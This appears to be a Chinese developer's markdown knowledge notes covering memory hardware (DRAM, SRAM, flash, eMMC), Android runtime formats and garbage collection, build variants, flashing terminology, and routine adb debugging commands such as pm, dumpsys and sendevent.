中央处理器（CPU）与主机板上的主存储器（SDRAM）存取资料时的“工作时脉”（Clock）相同，故称为“同步”（Synchronous）。由于 CPU 在存取资料时不需要“等待”（Wait）因此效率较高，SDRAM 的存取速度较 DRAM 快，所以早期电脑主机板上都是使用 SDRAM 来取代传统 DRAM，不过目前也只有少数工业电脑仍然使用 SDRAM。

可以记住一个简单的结论：SRAM 比较快、 DRAM 比较慢；SRAM 比较贵、DRAM 比较便宜。



这是我们平常在计算机中使用的内存，更精确的说法应该叫”内存模块”（Memory Module）。一个内存模块实际上就是由一块小电路板、再加上几块的 DRAM 芯片构成。图标中的内存模块上一共有 8 个 DRAM 芯片。让我们把一个 DRAM 芯片的内部结构剖开看看，会看到一个储存数组（Memorry Array）。

CPU 会给这个储存数组”行地址”和”列地址”，就可以选出一个”储存单元”。常见

的储存单元包含了 4 bit 或 8 bit，每一个 bit 都会采用一个电路结构，我们称为 DRAM 的一个”基本储存单元”。

这个基本储存单元中包含了一个晶体管匹配一个电容。然后就可以视电容器是否有充电电荷存在、来判别目前的记忆状态。


“写入内存”的动作，就是由外部的数据线、对电容进行充电或放电，从而完成写入 1 或 0 的数字数据。

DRAM 使用一个晶体管（MOS）与一个电容来储存一个位的资料（一个 0 或一个 1），如图四（a）所示，当晶体管（MOS）不导通时没有电子流过，电容没有电荷，代表这一个位的资料是 0，如图四（b）所示；当晶体管（MOS）导通时（在闸极施加正电压），电子会由源极流向汲极，电容有电荷，代表这一个位的资料是 1，为了要将这些流过来的电荷“储存起来”，因此必须使用一个微小的电容，如图四（c）所示，DRAM 就是因为电容需要时间充电，所以速度比 SRAM 还慢。




▲ 图四：动态随机存取存储器（DRAM）的结构与工作原理示意图。

由于电容会有漏电的现象，导致电位差不足而使记忆消失，因此除非电容经常周期性地充电，否则无法确保数据能长久保存起来。

由于每个 DRAM 基本储存单元的电路结构非常的简单，所以功耗低、价格也较低。这样一来用低成本就能制造出大储存容量的 DRAM 芯片。缺点就是读写的速度慢（电容要充电放电），影响了 DRAM 的性能。

SRAM 的结构则较为复杂，一共有六个晶体管构成。我们能分别用 M1、M2、M3 到 M6 进行标记。这六个晶体管合起来才能保存一个 bit。



SRAM 芯片和 DRAM 芯片不太一样，不需要分成行地址和列地址分别选择，而且 SRAM 的设计相对来说又更加灵活，一个地址对应的储存单元数量可以是 8 bit、10 bit，或 32 bit、40 bit、64 bit 都行。

另外，晶体管的开关速度远比电容充电放电的速度还快，所以相对于 DRAM、SRAM 的读写速度比 DRAM 快很多。

然而 SRAM 中要储存一个 bit 就得用到六个晶体管。晶体管的数量一多、就会造成芯片的面积变大，从而带来集成电路难以变得更小、还有价格更贵的问题。

（SRAM 的价格比起 DRMA 要高达 1000 倍以上。比如 2010 年世代––—SRAM 的每单位储存价格是 $60/MB，DRAM 则是 $0.06/MB。）

同时每个晶体管都要耗电，晶体管越多、功耗就越高。考虑到价格高和功耗大，目前只能在一些很严苛的地方来使用 SRAM，比如上面提到的快取 (Cache)。

故目前”主存储器”还是使用 DRAM 技术，但小块用来拉速度的”快取”就是采用 SRAM。然而无论是 DRAM 还是 SRAM，一不供应电源就会丧失储存的数据，所以都叫做挥发性内存。

铁电随机存取存储器 FRAM

动态随机存取存储器（DRAM）是以一个晶体管加上一个电容来储存一个位（1bit）的资料，由于传统 DRAM 的电容都是使用“氧化矽”做为绝缘体，氧化矽的介电常数不够大（K 值不够大），因此不容易吸引（储存）电子与电洞，造成必须不停地补充电子与电洞，所以称为“动态”，只要电脑的电源关闭，电容所储存的电子与电洞就会流失，DRAM 所储存的资料也就会流失。

要解决这个问题，最简单的就是使用介电常数够大（K 值够大）的材料来取代“氧化矽”为绝缘体，让电子与电洞可以储存在电容里不会流失。目前业界使用“钛锆酸铅”（PZT）或“钽铋酸锶”（SBT）这种介电常数很大（K 值很大）的“铁电材料”（Ferroelectric material）来取代氧化矽，则可以储存电子与电洞不会流失，让原本“易失性”的动态随机存取存储器（DRAM）变成“非易失性”的存储器称为“铁电随机存取存储器”（Ferroelectric RAM，FRAM）。


DDR的种类：
1、DDR SDRAM：Double Data Rate Synchronous Dynamic Random Access Memory，双倍数据率同步动态随机存取存储器；能在选通脉冲的上升沿和下降沿传输数据
2、DDR2 SDRAM：Double-Data-Rate Two Synchronous Dynamic Random Access Memory，第二代双倍数据率同步动态随机存取存储器；DDR2的数据传输速度为系统时钟频率的四倍
3、DDR3 SDRAM：Double-Data-Rate Three Synchronous Dynamic Random Access Memory，第三代双倍数据率同步动态随机存取存储器；DDR3的数据传输速度为系统时钟频率的8倍
4、DDR4 SDRAM：Double-Data-Rate Fourth  Synchronous Dynamic Random Access Memory，第四代双倍数据率同步动态随机存取存储器。

 
NAND Flash 又是什么呢？


继续讲讲非易失性的部分：

Flash（闪存）由于具备了重量轻、体积小、功率低等优点，被应用在各类电子产品的硬盘上。Flash 又可以分成 NOR 型 Flash 和 NAND 型 Flash。
FLASH：是一种ROM（Read Only Memory），与其他ROM的不同在于半导体等级。注意：FLASH必须以扇区为单位访问，而NVRAM以字节为单位访问。这是NVRAM驱动必须实现一个算法（即一开始就复制一个扇区内的所有内容到RAM）的原因。

NOR Flash 比 NAND Flash 更早导入市场。读取的速度较快，但写入的速度慢、价格也比 NAND Flash 贵。

目前用来储存操作系统的程序代码或重要数据，比如拿来做 ROM。像是生产 NOR Flash 的台厂旺宏就是因为打入任天堂 Switch 主机的 ROM 供应链，今年营收上看攀升。

NAND Flash 写入的速度快、价格较低，故目前以 NAND Flash 最为普遍。现在的 USB 硬盘和手机储存空间，就是用 NAND Flash 为主流技术。

另外，固态硬盘（Solid State Drive, SSD）也是以 NAND 型 Flash 为基础所建构的储存装置。SSD 不像传统硬盘（HDD）中有马达、读写臂等零件。速度慢、功耗高，对震动又相当敏感，很难用在小型行动装置中。

SSD 在读写数据时不会有噪音，耐震、传输速度快、重量又能缩减到 HDD 十分之一以上，现在已经成为个人计算机和笔记本电脑的主流储存设备。

NVRAM（Non-Volatile Random Access Memory）： 非易失性随机访问存储器。电子设备能快速地访问该存储空间的内容（大多数情况下此类设备都是以字节方式地访问这些内容，并且掉电后也能保存它们）。有多种技术能实现这一策略，其中EEPROM是比较常见的。但是需注意的是：在手机设计中，通常用ROM的一个或两个扇区（实际上更多的情况下这个ROM就是 FLASH）来模拟NVRAM，这样做的原因当然是节省花费了（因为ROM是必须的，而NVRAM则不一定）。

NVM：非易失性存储器。这是更普遍的概念，它涵盖了所有在掉电后仍能保持其内容的内存组件。在体系设计上这个技术是很有用的，它的技术详情此处省略。实际上，在一个工程中一个带有电池的DRAM（动态随机访问存储器）就能扮演NVM的角色，并且能很好地工作。

eMMC 是 embedded MultiMediaCard 的简称。MultiMediaCard，即 MMC， 是一种闪存卡（Flash Memory Card）标准，它定义了 MMC 的架构以及访问　Flash Memory 的接口和协议。而 eMMC 则是对 MMC 的一个拓展，以满足更高标准的性能、成本、体积、稳定、易用等的需求。
eMMC=NAND闪存+闪存控制芯片+标准接口封装

https://blog.csdn.net/qq_39759656/article/details/81182147
```

## [知识点] 定时开关机-Android4.4/6.0

```text
https://blog.csdn.net/qq_27840681/article/details/78889813

一、寄存器介绍——RTCSA & RTCSAR
1.RTC是Real Time Clock的简称，它在硬件电路上单独供电，当系统关机时，CPU和其他外部硬件设备全部掉电，但是RTC仍然继续工作.
2.HWCR (Hibernate Wakeup Control Register)是一个控制休眠唤醒的寄存器，如果我们要使用休眠状态下RTC唤醒的功能，我们需要打开它的第0位ELAM(RTC Alarm Wakeup enable)，当ELAM置1时，使能ELAM功能。
3.RTCSR (RTC Second Registe)是一个32位的寄存器，它的值以1Hz的频率加1，即每秒自动加1。
4.RTCSAR (RTC Second Alarm Register)是一个以秒为单位的闹钟寄存器，我们可以将设置的格林威治时间转换成相应的秒数然后写进这个寄存器，即完成了我们设置的闹钟。我们打开HWCR中的ELAM，按power键关机，当RTC检测到RTCSR == RTCSAR的值时，RTC将会唤醒CPU，并从XBOOT开始进行开机启动。
```

## [知识点] Android dex/odex/oat/vdex/art区别

```text
1.dex
java程序编译成class后，dx工具将所有class文件合成一个dex文件，dex文件是jar文件大小的50%左右.

2.odex（Android5.0之前）全称： Optimized Dalvik Executable;从字面意思上理解,就是经过优化的 Dalvik 可执行文件。
Android5.0之前APP在安装时会进行验证和优化，为了校验代码合法性及优化代码执行速度，验证和优化后，会
产生ODEX文件，运行Apk的时候，直接加载ODEX，避免重复验证和优化，加快了Apk的响应时间.
注意：优化会根据不同设备上Dalvik虚拟机版本、Framework库的不同等因素而不同，在一台设备上被优化过
的ODEX文件，拷贝到另一台设备上不一定能够运行。
Android程序apk文件为zip压缩包格式，dalvik虚拟机每次加载它们需要从apk中读取classes.dex文件，耗费大量CPU时间，而odex文件已经包含了加载dex必须的依赖库文件列表，只需要检测并加载需要的依赖库即可，大大缩短了读取dex文件所需时间。
odex生成：（1）使用dexopt-wrapper工具（2）从apk中提取，这种多是Android ROM的系统程序（3）dalvik-cache缓存文件
odex文件结构：它是dex文件的一个超集，由odex文件头、dex文件、依赖库、辅助数据组成

3.oat（Android5.0之后）
oat是ART虚拟机运行的文件,是ELF格式二进制文件,包含DEX和编译的本地机器指令,oat文件包含DEX文件，因此比ODEX文件占用空间更大。
Android5.0以后在编译的时候(此处指系统预置app，如果通过adb install或者商店安装，在安装时
dex2oat把dex编译为odex的ELF格式文件)dex2oat默认会把classes.dex翻译成本地机器指令，生成ELF格
式的OAT文件，ART加载OAT文件后不需要经过处理就可以直接运行，它在编译时就从字节码装换成机器码了，因
此运行速度更快。不过android5.0之后oat文件还是以.odex后缀结尾,但是已经不是android5.0之前的文件
格式，而是ELF格式封装的本地机器码.
可以认为oat在dex上加了一层壳，可以从oat里提取出dex.

4.vdex
Android8.0以后加入的,包含APK的未压缩DEX代码，另外还有一些旨在加快验证速度的元数据。

5.art (optional)
包含APK中列出的某些字符串和类的ART内部表示，用于加快应用启动速度。
ART 代表 Android Runtime，其处理应用程序执行的方式完全不同于 Dalvik，Dalvik 是依靠一个 Just-In-Time (JIT) 编译器去解释字节码。开发者编译后的应用代码需要通过一个解释器在用户的设备上运行，这一机制并不高效，但让应用能更容易在不同硬件和架构上运 行。ART 则完全改变了这套做法，在应用安装时就预编译字节码到机器语言，这一机制叫 Ahead-Of-Time (AOT）编译。在移除解释代码这一过程后，应用程序执行将更有效率，启动更快。

预先 (AOT) 编译
ART 引入了预先编译机制，可提高应用的性能。ART 还具有比 Dalvik 更严格的安装时验证。在安装时，ART 使用设备自带的 dex2oat 工具来编译应用。该实用工具接受 DEX 文件作为输入，并为目标设备生成经过编译的应用可执行文件。该工具应能够顺利编译所有有效的 DEX 文件。

垃圾回收优化
垃圾回收 (GC) 可能有损于应用性能，从而导致显示不稳定、界面响应速度缓慢以及其他问题。ART 通过以下几种方式对垃圾回收做了优化：
- 只有一次（而非两次）GC 暂停
- 在 GC 保持暂停状态期间并行处理
- 在清理最近分配的短时对象这种特殊情况中，回收器的总 GC 时间更短
- 优化了垃圾回收的工效，能够更加及时地进行并行垃圾回收，这使得 GC_FOR_ALLOC 事件在典型用例中极为罕见
- 压缩 GC 以减少后台内存使用和碎片

开发和调试方面的优化
- 支持采样分析器
  
一直以来，开发者都使用 Traceview 工具（用于跟踪应用执行情况）作为分析器。虽然 Traceview 可提供有用的信息，但每次方法调用产生的开销会导致 Dalvik 分析结果出现偏差，而且使用该工具明显会影响运行时性能

ART 添加了对没有这些限制的专用采样分析器的支持，因而可更准确地了解应用执行情况，而不会明显减慢速度。KitKat 版本为 Dalvik 的 Traceview 添加了采样支持。


- 支持更多调试功能

ART 支持许多新的调试选项，特别是与监控和垃圾回收相关的功能。例如，查看堆栈跟踪中保留了哪些锁，然后跳转到持有锁的线程；询问指定类的当前活动的实例数、请求查看实例，以及查看使对象保持有效状态的参考；过滤特定实例的事件（如断点）等。

- 优化了异常和崩溃报告中的诊断详细信息
  
当发生运行时异常时，ART 会为您提供尽可能多的上下文和详细信息。ART 会提供 ``java.lang.ClassCastException``、``java.lang.ClassNotFoundException`` 和 ``java.lang.NullPointerException`` 的更多异常详细信息（较高版本的 Dalvik 会提供 ``java.lang.ArrayIndexOutOfBoundsException`` 和 ``java.lang.ArrayStoreException`` 的更多异常详细信息，这些信息现在包括数组大小和越界偏移量；ART 也提供这类信息）。

ART GC
ART 有多个不同的 GC 方案，这些方案包括运行不同垃圾回收器。默认方案是 CMS（并发标记清除）方案，主要使用粘性 CMS 和部分 CMS。粘性 CMS 是 ART 的不移动分代垃圾回收器。它仅扫描堆中自上次 GC 后修改的部分，并且只能回收自上次 GC 后分配的对象。除 CMS 方案外，当应用将进程状态更改为察觉不到卡顿的进程状态（例如，后台或缓存）时，ART 将执行堆压缩。

除了新的垃圾回收器之外，ART 还引入了一种基于位图的新内存分配程序，称为 RosAlloc（插槽运行分配器）。此新分配器具有分片锁，当分配规模较小时可添加线程的本地缓冲区，因而性能优于 DlMalloc。

与 Dalvik 相比，ART CMS 垃圾回收计划在很多方面都有一定的改善：

- 与 Dalvik 相比，暂停次数从 2 次减少到 1 次。Dalvik 的第一次暂停主要是为了进行根标记，即在 ART 中进行并发标记，让线程标记自己的根，然后马上恢复运行。

- 与 Dalvik 类似，ART GC 在清除过程开始之前也会暂停 1 次。两者在这方面的主要差异在于：在此暂停期间，某些 Dalvik 环节在 ART 中并发进行。这些环节包括 java.lang.ref.Reference 处理、系统弱清除（例如，jni 弱全局等）、重新标记非线程根和卡片预清理。在 ART 暂停期间仍进行的阶段包括扫描脏卡片以及重新标记线程根，这些操作有助于缩短暂停时间。

- 相对于 Dalvik，ART GC 改进的最后一个方面是粘性 CMS 回收器增加了 GC 吞吐量。不同于普通的分代 GC，粘性 CMS 不移动。系统会将年轻对象保存在一个分配堆栈（基本上是 java.lang.Object 数组）中，而非为其设置一个专属区域。这样可以避免移动所需的对象以维持低暂停次数，但缺点是容易在堆栈中加入大量复杂对象图像而使堆栈变长。

ART GC 与 Dalvik 的另一个主要区别在于 ART GC 引入了移动垃圾回收器。使用移动 GC 的目的在于通过堆压缩来减少后台应用使用的内存。目前，触发堆压缩的事件是 ActivityManager 进程状态的改变。当应用转到后台运行时，它会通知 ART 已进入不再“感知”卡顿的进程状态。此时 ART 会进行一些操作（例如，压缩和监视器压缩），从而导致应用线程长时间暂停。目前正在使用的两个移动 GC 是同构空间压缩和半空间压缩。

- 半空间压缩将对象在两个紧密排列的碰撞指针空间之间进行移动。这种移动 GC 适用于小内存设备，因为它可以比同构空间压缩稍微多节省一点内存。额外节省出的空间主要来自紧密排列的对象，这样可以避免 RosAlloc/DlMalloc 分配器占用开销。由于 CMS 仍在前台使用，且不能从碰撞指针空间中进行收集，因此当应用在前台使用时，半空间还要再进行一次转换。这种情况并不理想，因为它可能引起较长时间的暂停。

- 同构空间压缩通过将对象从一个 RosAlloc 空间复制到另一个 RosAlloc 空间来实现。这有助于通过减少堆碎片来减少内存使用量。这是目前非低内存设备的默认压缩模式。相比半空间压缩，同构空间压缩的主要优势在于应用从后台切换到前台时无需进行堆转换。

注意：Android5.0以后在／data/dalvik-cache目录下的.dex文件已经不是android5.0之前的dex文件，
它是ELF文件,可以使用file命令查看如下：

# file system@app@Camera2@Camera2.apk@classes.dex
system@app@Camera2@Camera2.apk@classes.dex: ELF 64-bit LSB shared object, ARM aarch64, version 1 (GNU/Linux), dynamically linked, stripped

Dalvik与ART的区别DalvikJIT（Just-in-time）实时编译，运行的时候将字节码翻译成机器码，所运行的目标（dex）与硬件平台无关，APP运行效率低。ARTAOT（Ahead-Of-Time，预先编译）,运行前将字节码翻译成机器码，所运行的目标文件（oat）与硬件平台相关。APP运行效率高，但是会占用空间，APK安装所需时间增加。odex是干什么的dalvik时代：apk运行的时候，会把Apk中的classes.dex解压出来并通过dexopt优化为.odex文件。缓存在/data/dalvick-cache目录下，提高后续执行的效率。ART时代：APK安装的时候，会把APK中的classes.dex解压后，通过dex2oat工具转换为.odex文件（ELF格式），存储在apk所在的目录的oat目录下。
```

## [知识点] Leanback

```text
Google 的 Leanback 项目
Leanback 是 Google 真的 TV 开源的一款 UI 框架，可以使用 Leanback 快速实现 UI 效果，Leanback 主要都是围绕 Fragment 展开的。
在国内的 TV App 项目中，基本上都不会使用 Leanback 推荐的效果，就像 Google 的 Material Design 设计，所有设计都在转发文章，但是就是不用，不过这并不妨碍我们研究它的实现。
Leanback 内提供的 RecyclerView 把一些很头疼的焦点记忆、焦点项目放大、滚动时焦点块居中等问题都封装好了，简单到可以拿来即用。
Leanback 最大的问题，就是它是一个 v17 的项目，也就是 minSdkVersion 为 17，而在国内的环境下，TCL、联想都还在出厂 4.2 以下的电视和盒子。
也就是说对于一个商业项目，你想完全依赖 Leanback 的官方指导来开发 App，将会有一部分设备的市场被放弃掉。
但是这并不是无法解决的硬伤，我印象中只是某些数据刷新的 notifyDataXxx() 方法，对 API Level 有要求。所以只需要将这部分逻辑自己来实现，就可以将 Leanback 用在 V14 的设备上。
具体实现我就不放代码了，在 Github 上搜索 “V14 Leanback” 关键字，就能够有所收获。
Leanback-GoogleSample Github：https://github.com/googlesamples/leanback-showcase
```

## [知识点] 硬解，软解

```text
硬解码：由显卡核心GPU来对高清视频进行解码工作，CPU占用率很低，画质效果比软解码略差一点，需要对播放器进行设置。
优点：播放流畅、低功耗
缺点：受视频格式限制、功耗大、画质没有软解码好

软解码：由CPU负责解码进行播放
优点：不受视频格式限制、画质略好于硬解
缺点：会占用过高的资源、对于高清视频可能没有硬解码流畅(主要看CPU的能力）。就好比两个人一样，一个人有一个袋子，一个人只能用手，在拿东西的时候有袋子的肯定会省力一些。但是在个别情况下袋子不方便装的话可能需要手直接拿着。

软解码和硬解码哪个好?

软解码是在显卡本身不支持或者部分不支持硬件解码的前提下，将解压高清编码的任务交给CPU，这是基于硬件配置本身达不到硬解压要求的前提下，属于一个折中的无奈之举。那这么说是不是软解压就一无是处了呢?不，这要是情况而定。对于一个不看、或者不经常看高清的用户而言，如果专门为很少用到的功能进行过多支出，那无疑是一种浪费;而在保证正常应用的前提下，还能在偶尔看一下高清的时候自己的电脑配置不至于播放不了，或者播放不流畅，那么这时候一颗性能不算太次的CPU就大有用武之地了，好在现在早已是双核，甚至多核CPU的时代，这个已经不是问题。总结软解码的好处，就是成本低廉，几乎不用二次投入，就可以享受高清带来的乐趣和震撼。

所以硬解码和软解码是相辅相成的，没有电脑或者手机只有硬解码，也没有电脑或者手机只有软解码。当然在个人看来硬解码更为省电，但是对于手机本身的硬件要求也较高，软解码则反之。
```

## [知识点] permission 和 uses-permission 的区别

```text
两者之间的不同之一就是，作用域不同，在 manifest.xml文件中，<uses-permission>是和<application>同级的节点，一般<uses-permission >是在</application>后面的。但<permission>就不同了，是定义在<application>和</application>之间，和Activity、Service同级别的，同时使用 group的权限组可以大幅减少你同类型相似权限的声明。
其二可能就是<uses-permission>是官方定义的权限，<permission>是自己定义的权限。
ps：uses-permission这个是给整个apk用的权限，permission是给自己activity或者service使用的权限
```

## [知识点] user版本和eng版本的区别， TODO : UserDebug版本呢?????

```text
1.user 版本为提高第一次开机速度，使用了ART 的预优化，将dex 文件分解成可直接load 运行的odex 文件；ENG 版本不会开启这项优化，每次开机都会从apk包解析出dex文件，执行的是dex文件，降低运行速度。
2.user版本更少的LOG 打印，UART 的关闭。UART，是一种异步收发传输器。
3.ART执行的区别
user：首次开机执行一次，apk->dex->odex->被ART执行  ----->直接被优化为odex后，一直不用去apk中提取dex，直接运行odex文件就可以了，这样速度就快了
eng：每次执行，apk->dex->被ART执行
4.编译路径区别
User版：64位路径：out/.../system/app/arm64/***.odex
32位路径：out/.../system/app/arm/***.odex
User版本的32位apk在64位系统环境下编译时，默认被编译解析为64位路径。当运行时找不到其32位的默认路径，报错。在Android.mk文件中加入LOCAL_MULTILIB := 32，可以编译解析为32位路径，运行不报错。
Eng版本没有32位和64位区分，运行不报错
5、如何分辨32位和64位系统
1.ProjectConfig.mk文件中，MTK_K64_SUPPORT = yes/no
2.在sagereal/mk/项目名/full_sr67**m_**gu_l.mk中，
# Inherit for devices that support 64-bit primary and 32-bit secondary zygote startup script
$(call inherit-product, $(SRC_TARGET_DIR)/product/core_64_bit.mk)
有以上这句话的是64位系统，反之没有这句话是32位系统。
3.在alps/device/sagetel/     sr6735m_35gu_l（32位系统）     sr6735m_65u_l（64位系统）
4.在当前手机中查看。输入adb shell---->cd system----->ls----->看到lib(lib64)，32位系统没有lib64文件夹，64位系统含有lib和lib64文件夹
```

## [知识点] AsyncTask 和 Thread 的使用场景

```text
AsyncTask 的使用场景
不需要下载大量数据的简单网络操作
I/O 密集型任务，耗时可能几个毫秒以上

Java Thread 使用场景
涉及中等或大量的网络数据操作（包括上传和下载）
需要在后台执行的 CPU 密集型任务
当你想要在 UI 线程控制 CPU 占用率时

还有一个老生常谈的问题就是，千万不要在 UI 线程（主线程）执行网络操作。你需要使用上述两种方式之一来访问网络。
```

## [知识点] system/priv-app 和 system/app 的区别

```text
在system/priv-app目录主要是存放手机厂商定制的系统的系统级应用，比如phone app,settings app，systemui app等，这些应用需要系统及权限，而又不能被用户卸载掉。这个目录是在Android KitKat新增加的分区。在KitKat之前版本在系统分区的所有apks都可以使用系统权限，这个更改使手机厂商能够更好的控制捆绑软件对敏感权限的访问。手机厂商在定制一些系统软件的时候软件也会需要专门给priv-app添加selinux policy。当然应用需要获取系统权限还有其他的办法，在AndroidManifest.xml文件中添加 android:sharedUserId="android.uid.system",同时给该apk添加系统签名，比如小米手机就需要给apk添加小米的系统权限。
```

## [知识点] Android Button有默认padding值的元凶

```text
https://blog.csdn.net/vv_bug/article/details/71698200
把padding设置为0还是有边距的原因?theme中默认把minHeight设置为56dp
所以需要把minHeight先改为0dp
```

## [知识点] xcap补充业务

```text
对基本电信业务进行修改或者补充的业务
依附于基本呼叫之上而为用户特别提供的、满足特殊应用场景的业务功能，补充业务不能独立存在

移动补充业务主要包括6个大类
呼叫完成
多方呼叫
呼叫限制
计费通知
呼叫前转
号码识别
```

## [知识点] 刷机术语

```text
一、对于刷机里面一些概念的理解

首先，小白们的手机出了问题，论坛里的大佬们提出了解决方法，小白们却还是不会操作，根目录是什么呢，双清又是啥?下面我就对一些操作做一些简单的解释：

1、BL锁
BL锁就是bootloader锁，BL从安卓问世以来一直存在，它的功能在我看来应该是限制用户刷第三方ROM和降级系统。在锁住bl的情况下，用户是根本不可能刷第三方ROM和第三方recovery的，最多也就是刷个基于官方的精简包。bl还有一个恶心的限制就是root，所有要root的机器，都必须解锁才能获取。那有人就问了，为什么以前的老机器和安卓4点几的机子都可以一键root呢，这是因为以前的机器bl锁等级低，我们可以利用bl锁的漏洞，绕过bl解锁。然而现在的系统BL等级比较高，自然就无法绕过BL锁去root了。

2、REC
REC是Recovery的缩写，是每部安卓机出厂时自带的恢复模式，不过那都是官方的Recovery。Recovery就是像是电脑上的小型winPE系统，winPE可以在电脑上安装操作系统，或者做些备份、管理的工作。如果把手机比喻成房屋，那么地皮就像手机的硬件，房子像手机系统，建房子的各种工具就是就是Recovery了。官方Recovery只能用来刷入官方的系统，如果你想刷入别的系统，只能通过第三方Recovery来实现，但是，你平时所用到的在线升级也就是OTA升级，是基于官方Rec的，如果你刷入了第三方Rec，OTA升级就会失败。

3、TWRP
TWRP是国外android爱好者开发的一个第三方REC，全名是：TeamWin Recovery Project，也是我们现在刷第三方ROM通常用到的REC。
https://twrp.me/

4、双清
wipe data/factory reset：清除用户数据并恢复出厂设置
wipecache partition：清除系统缓存 ，
一般刷机前执行，具体看资源发布者的要求。

5、三清
wipe data/factory reset：清除用户数据并恢复出厂设置
wipe cache partition：清除系统缓存
wipe dalvik cache：清除安卓虚拟机缓存
具体看资源发布者的要求。

6、四清
wipe data/factory reset：清除用户数据并恢复出厂设置
wipe cache partition：清除系统缓存
wipe dalvik cache：清除安卓虚拟机缓存
wipe system：清除系统

该操作可以更干净地刷入新系统，但并不建议也尽量不要四清，具体看资源发布者的要求。
在这里我要说一下，很多人会觉得四清五清等多清会让刷入的系统更干净，其实这是一种误区，这样子很容易引起手机卡信号基带异常，例如电信卡无法出现4G+等情况出现，内存卡异常等问题，很多人说刷机过后信号没了，就是刷机多清的问题，除了首次刷机需要格式化内存卡，刷回官方固件的时候会自动清卡以外，其他时候完全没必要多清。

System这个分区基本包含了整个安卓操作系统，包括安卓用户界面、和所有预装的系统应用程序。擦除这个分区，会删除整个安卓系统，但不会导致不能启动。你可以通过进入Recovery程序，安装一个新ROM，也就是新的安卓系统。双清三清四清会清空个人的用户数据包括 ：应用程序、短信信息、联系人、通讯录、应用数据等等...，但不会清空内置卡如 图片、音乐、个人文件等等（此话来源于DK大佬……懒得打直接复制了）。

7、根目录　　

楼主想了一下，觉得有必要为小白们科普一下什么是根目录。根目录指逻辑驱动器的最上一级目录，它是相对子目录来说的。点开手机内部储存看到的就是手机的根目录，同理，在电脑上也是一样，打开“我的电脑”，双击C盘就进入C盘的根目录，双击D盘就进入D盘的根目录，点开游戏文件夹看到的就是游戏的根目录。
```text
#####################################################################################################
#####################################################################################################
########################################## 知识点 end ################################################
#####################################################################################################
#####################################################################################################



#####################################################################################################
#####################################################################################################
########################################## CMD begin ################################################
#####################################################################################################
#####################################################################################################

## [CMD] getevent, sendevent

```text
而使用 sendevent可以避免这样的问题，但sendevent的数据格式有些复杂，这是一个方案。

模拟电源键长按(getevent,sendevent)
首先我在手机的shell下输入了getevent命令，这样就可以接收到手机上操作的所有event事件。
这个时候我们按下我们手机电源键，来看看可以接收到哪些事件信息，按下电源键后：
我们得到了以上四条信息。
我们来以第一条为例分析一下获得是什么?
/dev/input/event0:  代表 device
0001                         代表一个type
0074                         代表power键的code(为16进制)
00000001                 代表value 一般 1代表按下，0代表放开。

根据查阅sendevent 需要的参数为就是device、type、code、value。

于是我们就可以通过下面四条命令即可完成按power键的操作，中间sleep的时间长度大于2秒，系统就认为是长按：
sendevent /dev/input/event0 1 116 1（0074转化为十进制后为116）
sendevent /dev/input/event0 0 0 0
sleep 3
sendevent /dev/input/event0 1 116 0
sendevent /dev/input/event0 0 0 0

一个达人写的通过getevent, sendevent类似的方法去录制屏幕的处理
https://github.com/TUSSON/android-event-recorder
```

## TODO : 自己用 c 编写一个可以在android 上运行的命令

```text
https://blog.csdn.net/earbao/article/details/51275463
https://blog.csdn.net/earbao/article/details/51275705
https://blog.csdn.net/earbao/article/details/51277087
https://blog.csdn.net/earbao/article/details/51277160
```

## [CMD] 查看手机中安装的所有apk的包名???

```text bash
adb shell pm -l
```

## [CMD] 查看 Android 许可权限

```text bash
adb shell pm list permissions -d -g
```

## [CMD] 在手机中执行脚本的一种方法

```text
1. 把脚本 test.sh push 到手机 /sdcard/ 或 /data/local/tmp (可能不存在，需要创建) 上
2. chmod 777 test.sh
3. sh test.sh &     让脚本在后台执行(否则拔了usb之后就会断开执行)
```

## [CMD] adb shell input 的代码实现

```text Java
private void sendKeyCode(int paramInt1, int paramInt2) {
    long l = SystemClock.uptimeMillis();
    KeyEvent localKeyEvent = new KeyEvent(l, l, paramInt2, paramInt1, 0);
    try {
        IWindowManager.Stub.asInterface(ServiceManager.getService("window")).injectKeyEvent(localKeyEvent, true);
        return;
    } catch (RemoteException localRemoteException) {
    }
}

private void sendTouchKeyEvent(int paramInt, boolean paramBoolean1, boolean paramBoolean2) {
    if (paramBoolean2);
    try {
        this.mIWM.injectKeyEvent(new KeyEvent(this.now, SystemClock.uptimeMillis(), 1, paramInt, 0), paramBoolean1);
        return;
        //this.now = SystemClock.uptimeMillis();
        //this.mIWM.injectKeyEvent(new KeyEvent(this.now, this.now, 0, paramInt, 0), paramBoolean1);
    } catch (RemoteException localRemoteException) {
    }
}

private void sendTouchKeyEvent(int paramInt1, boolean paramBoolean1, boolean paramBoolean2, int paramInt2) {
    if (paramBoolean2);
    try {
        this.mIWM.injectKeyEvent(new KeyEvent(0L, 0L, 1, paramInt1, paramInt2), paramBoolean1);
        return;
        //this.mIWM.injectKeyEvent(new KeyEvent(this.now, 1100L + this.now, 0, paramInt1, paramInt2, 0, 0, 0, this.flag), paramBoolean1);
    } catch (RemoteException localRemoteException) {
        Log.i("input", localRemoteException.toString());
    }
}
```

## [CMD] 根据包名查看apk的安装路径

```text bash
adb shell pm path com.sagereal.launcher
```

## [CMD] dumpsys 系统服务

```text bash
adb shell service list 列出所有系统服务 然后通过dumpsys media.camera 打印media.camera服务的信息
adb shell dumpsys meminfo 打印内存信息
adb shell dumpsys SurfaceFlinger 显示当前应用的包名
adb shell dumpsys activity
adb shell dumpsys cpuinfo CPU
adb shell dumpsys battery
adb shell dumpsys window（最后部分可以看到分辨率的信息） 有些service能够接收额外的参数，我们可以使用-h查看帮助信息。
adb shell dumpsys package -h
adb shell dumpsys activity -h
adb shell dumpsys activity o 能够输出oom的值 
adb shell dumpsys activity p 能够打印运行中的进程
```

## [CMD]  [log] 抓取kernel log

```text bash
adb shell cat /proc/kmsg > log.txt
```

## [CMD] 通过命令启动 Service

```text bash
adb shell am startservice -n "包名类名"   ----> service
```

## [CMD] 更新数据库命令

```text
update secure set value = 1 where name="device_provisioned";
```

## [CMD] 显示所有apk的包名等信息的adb命令

```text bash
adb shell pm list packages -f  ---> 显示所有apk的包名
adb shell pm list packages laun ---->显示包含“laun”的包名
-f：查看关联文件，即应用apk的位置跟对应的包名（如：package:/system/app /MusicPlayer.apk=com.sec.android.app.music）
-d：查看disabled packages
-e：查看enable package
-s：查看系统package
-3：查看第三方package
-i：查看package的对应安装者（如：1、 package:com.tencent.qqmusic installer=null 2、package:com.tencent.qqpim installer=com.android.vending）
-u：查看曾被卸载过的package。（卸载后又重新安装依然会被列 入）
```

## [CMD] 如何切换selinux的模式

```text
adb shell setenforce 0(宽容模式，permissive);
